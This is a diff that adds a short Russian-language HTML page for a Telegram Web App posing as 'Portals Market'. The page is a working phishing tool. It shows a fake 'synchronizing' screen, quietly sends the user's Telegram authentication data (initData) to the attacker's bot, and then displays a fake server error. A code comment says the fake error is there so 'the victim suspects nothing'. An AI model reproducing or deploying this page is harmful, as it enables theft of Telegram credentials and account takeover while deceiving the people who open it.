@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portals Market</title>
+    <!-- ЭТА СТРОКА ОБЯЗАТЕЛЬНА -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+</head>
+<body style="background:#000; color:#fff; text-align:center; padding-top:50px; font-family:sans-serif;">
+    <h2>Синхронизация...</h2>
+    <p>Пожалуйста, подождите.</p>
+    
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+        tg.expand();
+        
+        // Проверяем, есть ли данные от Telegram
+        if (tg.initData && tg.initData.length > 0) {
+            // Отправляем authData прямо в чат бота
+            tg.sendData(tg.initData);
+            
+            // Меняем экран, чтобы жертва ничего не заподозрила
+            document.body.innerHTML = '<h2>Ошибка сервера</h2><p>Попробуйте позже.</p>';
+        } else {
+            // Если данных нет (открыли просто как сайт)
+            document.body.innerHTML = '<h2>Ошибка авторизации</h2><p>Откройте через Telegram.</p>';
+        }
+    </script>
+</body>
+</html>
